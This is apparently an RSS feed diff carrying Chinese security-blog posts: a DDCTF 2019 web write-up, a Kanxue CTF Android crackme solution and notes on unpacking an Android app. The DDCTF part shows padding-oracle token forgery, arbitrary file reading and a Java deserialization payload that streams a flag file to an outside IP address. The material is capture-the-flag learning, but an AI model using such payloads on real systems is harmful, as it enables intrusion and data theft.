+    result += &#39;&#39;.join([chr(ord(x)^ord(y)) for x, y in zip(c_iv, binascii.unhexlify(mid_value))])
+    print(result)
+
+print(result)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;最后得到明文： &lt;code&gt;{&amp;quot;id&amp;quot;:100,&amp;quot;roleAdmin&amp;quot;:false}\x04\x04\x04\x04&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;很明显需要因此构造出： &lt;code&gt;{&amp;quot;id&amp;quot;:100,&amp;quot;roleAdmin&amp;quot;:true}\x06\x05\x05\x05\x05&lt;/code&gt;，此时的需要构造如下 iv（懒得算了，参考他人 writeup）：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;c1t=&#39;c3beeee4265cb3792c43365bd63a5516&#39;  # iv2
+0x00df71d27118c10e13141c66fc84619b  # mid
+ivt=&#39;7bfd18b65322f03e23383e1493e804da&#39;  # iv
+
+print base64.b64encode(ivt.decode(&#39;hex&#39;)+c1t.decode(&#39;hex&#39;)+base_token[32:48])
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;登录成功后由 &lt;code&gt;http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/fileDownload?fileName=1.txt&lt;/code&gt; 获得 hint:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Try to hack~ 
+Hint:
+1. Env: Springboot + JDK8(openjdk version &amp;quot;1.8.0_181&amp;quot;) + Docker~ 
+2. You can not exec commands~ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;很明显此处有一个任意文件读的问题存在，但受到了很明显的限制，经过尝试后发现在 &lt;code&gt;/proc/self/fd/15&lt;/code&gt; 可以获得源码。&lt;/p&gt;
+
+&lt;p&gt;之后就是源码审计 + 利用 JRMP 反序列化漏洞，相关的利用点在&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/nicaibudao_hahaxxxx/deserial?base64Info=&lt;/code&gt; 接口处&lt;/p&gt;
+
+&lt;p&gt;详情参考 &lt;a href=&#34;https://xz.aliyun.com/t/4862#toc-7&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;2019-DDCTF-WEB-WriteUp - 再来一篇 java&lt;/a&gt;，本人最后执行的 payload 如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;java.net.Socket s = new java.net.Socket(&amp;quot;39.108.230.53&amp;quot;,8768);
+java.io.File file = new java.io.File(&amp;quot;/flag/flag_7ArPnpf3XW8Npsmj&amp;quot;);
+java.io.InputStream in = new java.io.FileInputStream(file);
+int tempbyte;
+while ((tempbyte = in.read()) != -1) {
+  java.io.OutputStream out = s.getOutputStream();
+  out.write(tempbyte);
+}
+in.close();
+s.close();
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;最后在反弹出的 shell 里接到 flag:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/DDCTF2019-Web/DDCTF2019-Web-Java.png&#34; alt=&#34;Flag&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://xz.aliyun.com/t/3973&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;通过MySQL LOAD DATA特性来达到任意文件读取&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://xz.aliyun.com/t/4862&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;2019-DDCTF-WEB-WriteUp&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.zhaoj.in/read-5269.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;DDCTF 2019 Web 部分 WriteUp&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.xmsec.cc/ddctf-2019-writeup/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;DDCTF 2019 partial writeup&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://xz.aliyun.com/t/2479&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Weblogic JRMP反序列化漏洞回顾&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>看雪CTF - 变形金钢</title>
+      <link>https://syang-ng.github.io/2019/04/kanxue-transformer/</link>
+      <pubDate>Sun, 07 Apr 2019 00:42:32 +0000</pubDate>
+      
+      <guid>https://syang-ng.github.io/2019/04/kanxue-transformer/</guid>
+      <description>
+
+&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;看雪 CTF 的一道题目，感觉做完之后能对 Android 逆向有更进一步的理解，特地码一下。&lt;/p&gt;
+
+&lt;p&gt;题目链接：&lt;a href=&#34;https://ctf.pediy.com/game-season_fight-93.htm&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;第二题 变形金钢&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;android&#34;&gt;Android&lt;/h2&gt;
+
+&lt;p&gt;既然本题是 apk，那直接拖到 jadx 查看源码，很明显就能看到以下逻辑：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;private void login(final String str, final String str2, final Handler handler) {
+    Toast.makeText(this, &amp;quot;登录中。。。&amp;quot;, 1).show();
+    runnable = new Runnable() {
+        public void run() {
+            Message obtain = Message.obtain();
+            StringBuilder stringBuilder = new StringBuilder(str2);
+            if (str.equals(stringBuilder.reverse().toString())) {
+                obtain.obj = stringBuilder.toString();
+            } else {
+                obtain.what = 1;
+            }
+            handler.sendMessage(obtain);
+        }
+    };
+    cachedThreadPool.execute(runnable);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;看样子很简单，貌似只需要将账号的反序作为密码输入即可通过，但在实际操作过程中发现这是错误的。再仔细观察就能发现 &lt;code&gt;public class MainActivity extends AppCompiatActivity {&lt;/code&gt; 这行代码非常奇怪，正常情况下继承的应该是 &lt;code&gt;AppCompatActivity&lt;/code&gt; 这个类，二者存在细微的差异，于是继续去看 &lt;code&gt;AppCompiatActivity&lt;/code&gt; 的代码：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/kanxue-transformer/AppCompatActivity.png&#34; alt=&#34;AppCompiatActivity&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以发现谁是李逵，谁是李鬼了。由此我们可以推断真正的校验逻辑在 &lt;code&gt;AppCompaitActivity&lt;/code&gt; 这个类的 &lt;code&gt;public native boolean eq(String str);&lt;/code&gt; 函数内，可以看到这个函数是一个 native 函数，那么具体的校验逻辑必然在 &lt;code&gt;oo000oo&lt;/code&gt; 对应的 so 文件中&lt;/p&gt;
+
+&lt;h2 id=&#34;so&#34;&gt;So&lt;/h2&gt;
+
+&lt;p&gt;看到 Android 的 so 文件第一步就是看 &lt;code&gt;JNI_ONLoad&lt;/code&gt; 函数:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;signed int __fastcall JNI_OnLoad(int a1)
+{
+  int v1; // r8
+  signed int result; // r0
+  JNIEnv *v3; // r5
+  jclass v4; // r6
+  JNIEnv *v5; // [sp+0h] [bp-18h]
+  int v6; // [sp+4h] [bp-14h]
+  int v7; // [sp+8h] [bp-10h]
+
+  v7 = v1;
+  v5 = 0;
+  if ( !(*(int (**)(void))(*(_DWORD *)a1 + 24))() )
+    goto LABEL_4;
+LABEL_2:
+  result = -1;
+  while ( _stack_chk_guard != v6 )
+  {
+LABEL_4:
+    v3 = v5;
+    v4 = (*v5)-&amp;gt;FindClass(v5, (const char *)off_4010);
+    dword_4110 = (int)(*v3)-&amp;gt;NewGlobalRef(v3, v4);
+    if ( !v4 || (*v3)-&amp;gt;RegisterNatives(v3, v4, (const JNINativeMethod *)off_4014, 1) &amp;lt;= -1 )
+      goto LABEL_2;
+    result = 65542;
+  }
+  return result;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以发现本题使用的是利用 &lt;code&gt;jni&lt;/code&gt; 所提供的 &lt;code&gt;RegisterNatives&lt;/code&gt; 方法来动态注册 Native 函数，很明显 &lt;code&gt;off_4014&lt;/code&gt; 上存储的就是需要注册的函数的地址，使用 ida 查看发现地址对应是 &lt;code&gt;sub_784()&lt;/code&gt; 函数。&lt;/p&gt;
+
+&lt;h3 id=&#34;算法分析&#34;&gt;算法分析&lt;/h3&gt;
+
+&lt;p&gt;本题使用的是魔改的 RC4 和替换码表的 Base64 编码，本函数主要实现的功能如下：
+1. 对输入的字符串先调用一次 RC4 算法
+2. 再用魔改的 Base64 函数对加密后的字符串进行编码&lt;/p&gt;
+
+&lt;h3 id=&#34;rc4&#34;&gt;RC4&lt;/h3&gt;
+
+&lt;p&gt;先简单介绍 RC4 加密，该加密主要分为以下几个步骤：
+1. 根据密钥 key 生成 s-box
+2. 根据 s-box 生成伪随机的密钥流
+3. 异或按位加密明文&lt;/p&gt;
+
+&lt;p&gt;更详细的链接可以参考 &lt;a href=&#34;http://ronpa.top/2018/11/27/%E7%BB%8F%E5%85%B8%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86RC4%E5%88%86%E6%9E%90/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;经典对称加密RC4分析&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;下面我们来看程序内部的 RC4 加密，和经典的 RC4 算法一样，程序内部的 RC4 算法也分为这样几个步骤：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;密钥生成&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;这一段的代码最为冗长，但其实非常简单，即通过原始的密钥生成 RC4 算法所使用的密钥，大致是去掉 &lt;code&gt;-&lt;/code&gt; 后翻转再加上 &lt;code&gt;-&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/kanxue-transformer/RC4-Key.png&#34; alt=&#34;RC4 Key&#34; /&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;sbox 生成&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;下一步是 RC4 算法的 sbox：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/kanxue-transformer/RC4-SBox.png&#34; alt=&#34;sbox&#34; /&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;伪随机密钥流 / 加密明文&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/kanxue-transformer/Encrypt.png&#34; alt=&#34;encrypt&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;加密明文分为两部分，在和 sbox 生产的密钥流进行异或之后，密文会通过一个魔改的 base64 进行输出&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;魔改 Base64&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;对 Base64 的魔改有两个部分，一是替换码表，二是在每四个字符中，对第一个、第三个字符进行额外的异或处理，具体可以看上图的标注。&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;比较&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;最后程序会将加密后的输出对内置的输出进行比较，只有每一个字符相同才会认为是通过判断。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/kanxue-transformer/Compare.png&#34; alt=&#34;compare&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;solve&#34;&gt;Solve&lt;/h3&gt;
+
+&lt;p&gt;最后编写脚本如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import base64
+
+std_base64table = &amp;quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&amp;quot;
+base64table = &amp;quot;!:#$%&amp;amp;()+-*/`~_[]{}?&amp;lt;&amp;gt;,.@^abcdefghijklmnopqrstuvwxyz0123456789\\&#39;;&amp;quot;
+sbox = [0xf0,0x37,0xe1,0x9b,0x2a,0x15,0x17,0x9f,0xd7,0x58,0x4d,0x6e,0x33,0xa0,0x39,0xae,0x4,0xd0,0xbe,0xed,0xf8,0x66,0x5e,0x0,0xd6,0x91,0x2f,0xc3,0x10,0x4c,0xf7,0xa6,0xc1,0xec,0x6d,0xb,0x50,0x65,0xbb,0x34,0xfa,0xa4,0x2d,0x3b,0x23,0xa1,0x96,0xd5,0x1d,0x38,0x56,0xa,0x5d,0x4f,0xe4,0xcc,0x24,0xd,0x12,0x87,0x35,0x85,0x8e,0x6f,0xc6,0x13,0x9a,0xd3,0xfc,0xe7,0x8,0xac,0xb7,0xe9,0xb0,0xe8,0x41,0xaa,0x55,0x53,0xc2,0x42,0xbc,0xe6,0xf,0x8a,0x86,0xa8,0xcf,0x84,0xc5,0x48,0x74,0x36,0x7,0xeb,0x88,0x51,0xf6,0x7f,0x57,0x5,0x63,0x3e,0xfe,0xb8,0xc9,0xf5,0xaf,0xdf,0xea,0x82,0x44,0xf9,0xcd,0x6,0xba,0x30,0x47,0x40,0xde,0xfd,0x1c,0x7c,0x11,0x5c,0x2,0x31,0x2c,0x9c,0x5f,0x46,0x27,0xc4,0x83,0x73,0x16,0x90,0x20,0x76,0x7b,0xf2,0xe3,0xf3,0x77,0x52,0x80,0x25,0x9,0x26,0x3f,0xc7,0x18,0x1b,0xa3,0xff,0xfb,0xcb,0xa9,0x8c,0x54,0x7a,0x68,0xb4,0x70,0x4b,0xe2,0x49,0x22,0x7e,0xa5,0xb6,0x81,0x9d,0x4e,0x67,0xf1,0xa7,0x3c,0xd9,0x94,0xef,0x32,0x6b,0x1f,0xb1,0x60,0xb9,0x64,0x59,0x1,0xb3,0x7d,0xe0,0x6c,0xad,0x97,0x19,0xb5,0x3a,0xf4,0xd8,0x8d,0x98,0x3,0x93,0x1a,0xdc,0x1e,0x4a,0xc0,0x5a,0xe5,0xd1,0x3d,0x14,0xc8,0x79,0xbd,0x43,0xdb,0x69,0xd2,0x61,0x95,0x9e,0x21,0x45,0x89,0x2b,0xab,0x29,0xa2,0x8b,0x2e,0xd4,0xe,0x62,0xca,0x28,0xda,0x5b,0x72,0x8f,0x99,0x75,0xee,0x78,0xc,0x71,0xbf,0xdd,0xce,0x92,0x6a,0xb2]
+
+encode_flag = &amp;quot; {9*8ga*l!Tn?@#fj&#39;j$\g;;&amp;quot;
+
+def base64decode():
+    encode_flag1 = []
+    for i in range(len(encode_flag)):
+        if i % 4 == 0:
+            bit = 7
+        elif i % 4 == 2 and encode_flag[i] != &#39;;&#39;:
+            bit = 0xf
+        else:
+            bit = 0
+        encode_flag1.append(chr(ord(encode_flag[i])^bit))
+    encode_flag2 = &#39;&#39;.join(encode_flag1).translate(&#39;&#39;.maketrans(base64table, std_base64table))
+    return base64.b64decode(encode_flag2)
+
+def rc4decrypt(s):
+    i = 0
+    j = 0
+    ss = []
+    for k in range(len(s)):
+        i = (i + 1) % 256
+        j = (j + sbox[i]) % 256
+        sbox[i], sbox[j] = sbox[j], sbox[i]
+        index = (sbox[i] + sbox[j]) % 256
+        ss.append(chr(s[k] ^ sbox[index]))
+    print(&#39;&#39;.join(ss))
+
+print(rc4decrypt(base64decode()))
+# fu0kzHp2aqtZAuY6
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;补充&#34;&gt;补充&lt;/h3&gt;
+
+&lt;p&gt;.init_array 函数执行了 &lt;code&gt;datadiv_decode5009363700628197108&lt;/code&gt; 函数对字符串进行解密，之前在 ida 上直接显示的字符串是加密后的，因此可能部分是不可见的，只有在程序执行后执行该解密函数才会变成可见字符。&lt;/p&gt;
+
+&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://xz.aliyun.com/t/4614&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;先知社区 - 详解变形金刚&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://bbs.pediy.com/thread-250413.htm&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;看雪论坛 - 第二题 变形金刚&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://ronpa.top/2018/11/27/%E7%BB%8F%E5%85%B8%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86RC4%E5%88%86%E6%9E%90/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;经典对称加密RC4分析&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Android 某应用的简单逆向</title>
+      <link>https://syang-ng.github.io/2019/03/reverse-an-android-app/</link>
+      <pubDate>Fri, 22 Mar 2019 13:30:50 +0000</pubDate>
+      
+      <guid>https://syang-ng.github.io/2019/03/reverse-an-android-app/</guid>
+      <description>
+
+&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;项目需求，需要对 Android 逆向有一定了解。本周对某加壳应用进行了简单逆向，现在在博客上记录一下逆向过程。&lt;/p&gt;
+
+&lt;h2 id=&#34;java&#34;&gt;Java&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-An-Android-App/manifest.png&#34; alt=&#34;Manifest&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到该应用使用了自定义的 Application 和 Activity 作为程序入口，继续跟到这两个类看相应源码：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-An-Android-App/App.png&#34; alt=&#34;App&#34; /&gt;
+&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-An-Android-App/MAct.png&#34; alt=&#34;MAct&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到 &lt;code&gt;initSASDK()&lt;/code&gt; 函数明显存在一定的问题，推测为加壳应用的壳入口，继续跟进相应代码：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-An-Android-App/start.png&#34; alt=&#34;start&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到最终调用的 start 函数里有如下的执行流程:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;xzbs_ibq = WXMDGnzykrccwjZDVUmhfzZvEzBIzZfWBNKUhgaIOWSrSobBjR;
+srq(yiqomGNhdxLIJidVfyApfmJTIHPyutBbUkJxcWjBQHBrvbIXsOy, AvHtcXKhnamHsyrioJsYtObXYmrNsqUJmGFVnRXJTojtxBcOqgIj, FrzFWtDbeEGzjMXTZsUhYhYauwqXwJmljQFVrazhYTpbTiUljnepX, UyWqeczsunPuNjiSzoJlbLiNwGcpywsOaFqtWYqnJLjSYuVPEaozta, peVYfmJPInUHjHaTbqicJtUHmRZtZdUBcwvWjFSbbWlllsIdzEOXioi, LrAaxenJlqbZtbwLTeVausucgeMQpsscBeYNQPGYxiwYFHTARqqJgYDR);
+if (ezgyq()) {
+    xtmltaqolx(2, 3, 3, 3);
+    aozftlu();
+    lfob();
+    tevwztzyjqace();
+}
+umnyoz(324, 6, false, 6);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;很明显，&lt;code&gt;ezqyg()&lt;/code&gt; 函数试检测是否初始化完成的标志，阅读该函数代码：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;private static boolean ezgyq() {
+    String qyhhdfdclv = &amp;quot;aebchjtntz&amp;quot; + &amp;quot;xohpdsfuqm&amp;quot;;
+    String osrz = &amp;quot;zjydzywrik&amp;quot; + &amp;quot;yoxnmlxcskkcqfswphgt&amp;quot;;
+    int uzcjyygfg = (1471 + 1) * 2;
+    return (new File(ozxzzjhyypbi()).exists() &amp;amp;&amp;amp; new File(ozxzzjhyypbi()).length() == new File(dyozzxjqf()).length() / 2) ? false : true;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;很明显除了最后一行外都是插入的 junk code，而最后一行的比较非常明显，是比较某一个文件的大小是否是另一个文件的两倍。继续阅读 &lt;code&gt;ozxzzjhyypbi()&lt;/code&gt; 和 &lt;code&gt;dyozzxjqf()&lt;/code&gt; 函数的源码，我们知道这两个文件其实是 &lt;code&gt;/data/user/0/aaa.bbb.ccc/files/libswbqgonYxEgdlSXzbootstrap.so&lt;/code&gt; 和 &lt;code&gt;/data/app/aaa.bbb.ccc-1/lib/arm/libswbqgonYxEgdlSXzbootstrap.so&lt;/code&gt;，很明显，在初始化的过程中，程序会将 &lt;code&gt;libswbqgonYxEgdlSXzbootstrap.so&lt;/code&gt; 写入自身的 files 文件夹中，而且很有可能在写入过程中执行了某个解密函数，使得保存在本机的 so 文件只有之前的一半大小。&lt;/p&gt;
+
+&lt;p&gt;下面再看初始化函数会执行什么操作，首先是 &lt;code&gt;xtmltaqolx&lt;/code&gt; 函数会将 assets 文件下的几个文件拷贝到 files 文件夹下，代码优化如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;private static void xtmltaqolx(int asdEw, int ggplklssfq, int kzpjmjnwdg, int qziqcjievs) {
+    File filespath = new File(xzbs_ibq.getFilesDir().getAbsolutePath() + &amp;quot;/&amp;quot; + nwm_tau);
+    if (filespath.exists()) {
+        filespath.delete();
+        filespath.mkdirs();
+    } else {
+        filespath.mkdirs();
+    }
+    try {
+        for (String sofile : xzbs_ibq.getAssets().list(nwm_tau)) {
+            InputStream is = xzbs_ibq.getAssets().open(&amp;quot;wrhlrci/&amp;quot; + sofile);
+            FileOutputStream fos = new FileOutputStream(new File(filespath, sofile));
+            byte[] data = new byte[1024];
+            while (true) {
+                int i = is.read(data);
+                if (i == -1) {
+                    break;
+                }
+                fos.write(data, 0, i);
+            }
+            fos.close();
+            is.close();
+        }
+    } catch (Exception e) {
+        e.printStackTrace();
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;后面三个函数的逻辑较为简单，除去 junk code 发现其实三个函数执行的是一个功能，将 &lt;code&gt;libswbqgonYxEgdlSXzbootstrap.so&lt;/code&gt; 解密并完成之前所说的写入 files 文件夹下的功能。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;private static int hwfhcg_uyf = 0;
+private static byte[] ytukd_pkq = new byte[40960];
+
+private static void aozftlu() throws IOException {
+    hwfhcg_uyf = new FileInputStream(dyozzxjqf()).read(ytukd_pkq) / 2;
+}
+
+private static void lfob() throws IOException {
+    for (int i = 0; i &amp;lt; hwfhcg_uyf; i++) {
+        byte[] bArr = ytukd_pkq;
+        bArr[i] = (byte) (bArr[i] ^ ytukd_pkq[hwfhcg_uyf + i]);
+    }
+}
+
+private static void tevwztzyjqace() throws IOException {
+    new FileOutputStream(ozxzzjhyypbi()).write(ytukd_pkq, 0, hwfhcg_uyf);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到 apk 包中存储的其实是加密过的 so 文件，真正的 &lt;code&gt;libswbqgonYxEgdlSXzbootstrap.so&lt;/code&gt; 文件是由该文件的前半部分和后半部分异或而成的。&lt;/p&gt;
+
+&lt;p&gt;我们可以从 root 的 Android 手机上提取解密后的 so 文件，或者是编写 python 脚本来进行解密：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;data = file(&#39;libswbqgonYxEgdlSXzbootstrap.so&#39;, &#39;rb&#39;).read()
+mid = len(data) / 2
+so = [chr(ord(i) ^ ord(j)) for i, j in zip(data[:mid:], data[mid::])]
+with open(&#39;true.so&#39;, &#39;w&#39;) as f:
+    f.write(so)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;然后我们可以看到存在这样一行代码： &lt;code&gt;umnyoz(324, 6, false, 6);&lt;/code&gt;，会动态加载相应 so 文件。至此，Java 端的加密/解密部分已经结束了，我们可以发现 Java 端的操作就是解密并释放 assets 和 lib 文件夹下的 so 文件，然后通过 &lt;code&gt;System.load()&lt;/code&gt; 函数进行加载。&lt;/p&gt;
+
+&lt;h2 id=&#34;native&#34;&gt;Native&lt;/h2&gt;
+
+&lt;p&gt;但仅有这些操作是不够的，我们有足够的理由相信在 so 文件里还存在着加壳的部分逻辑，使用 ida 打开相应文件，找到 &lt;code&gt;JNI_Onload&lt;/code&gt; 函数：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-An-Android-App/jni_onload.png&#34; alt=&#34;JNI_Onload&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;现在可以确认 &lt;code&gt;JNI_Onload&lt;/code&gt; 函数里有加壳的逻辑操作，因此我们需要继续理解该函数。不过幸运的是，我们可以看到代码里加入了很多的 log 函数，我们可以使用这些输出的 log 加深我们对程序逻辑的理解。&lt;/p&gt;
+
+&lt;p&gt;这里截取部分 log：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: JNI_OnLoad
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: Got JNIEnv
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: 00
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: Got Context true
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: after setJavaObjectForDebug
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: getNames:  1
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: getNames:  1.1
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: getLibDir:  1
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: getLibDir:  2
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: adn/suflej/fvvhmduk
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: getLibDir:  2.1
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: getOutDexDir
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: ()Ljava/lang/String;
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: getLibDir:  2.2
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: getLibDir:  3
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: g_lib_dir /data/user/0/aaa.bbb.ccc/files/wrhlrci
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: getNames:  2
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: getNames:  4
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: join: libIQPFsmOUChmkwhbDdynamicloader.so
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: join: IQPFsmOUChmkwhbDdynamicloader.so
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: join: IQPFsmOUChmkwhbDdynamicloader.jar
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: so=libIQPFsmOUChmkwhbDdynamicloader.so, dex=IQPFsmOUChmkwhbDdynamicloader.jar
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: if (getNames()) is false
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: 2so=libIQPFsmOUChmkwhbDdynamicloader.so, dex=IQPFsmOUChmkwhbDdynamicloader.jar
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: decrypt
+03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: getLibDir:  1
+03-22 04:41:27.273 28000-28000/? E/sa_bootstrap: g_lib_dir /data/user/0/aaa.bbb.ccc/files/wrhlrci
+03-22 04:41:27.273 28000-28000/? E/sa_bootstrap: join: /libIQPFsmOUChmkwhbDdynamicloader.so
+03-22 04:41:27.273 28000-28000/? E/sa_bootstrap: join: /data/user/0/aaa.bbb.ccc/files/wrhlrci/libIQPFsmOUChmkwhbDdynamicloader.so
+03-22 04:41:27.273 28000-28000/? E/sa_bootstrap: join: /IQPFsmOUChmkwhbDdynamicloader.jar
+03-22 04:41:27.273 28000-28000/? E/sa_bootstrap: join: /data/user/0/aaa.bbb.ccc/files/IQPFsmOUChmkwhbDdynamicloader.jar
+03-22 04:41:27.273 28000-28000/? E/sa_bootstrap: src=https://syang-ng.github.io/data/user/0/aaa.bbb.ccc/files/wrhlrci/libIQPFsmOUChmkwhbDdynamicloader.so, out=/data/user/0/aaa.bbb.ccc/files/IQPFsmOUChmkwhbDdynamicloader.jar
+03-22 04:41:27.273 28000-28000/? E/sa_bootstrap: join: 53_81_64_77_28
+03-22 04:41:27.273 28000-28000/? E/sa_bootstrap: key = 53_81_64_77_28
+03-22 04:41:27.273 28000-28000/? E/sa_bootstrap: dexclassloader
+03-22 04:41:27.274 28000-28000/? E/sa_bootstrap: join: /data/user/0/aaa.bbb.ccc/files/
+03-22 04:41:27.274 28000-28000/? E/sa_bootstrap: join: /data/user/0/aaa.bbb.ccc/files/IQPFsmOUChmkwhbDdynamicloader.jar
+03-22 04:41:27.430 28000-28000/? E/sa_bootstrap: load success
+03-22 04:41:27.430 28000-28000/? E/sa_bootstrap: dexclassloader2
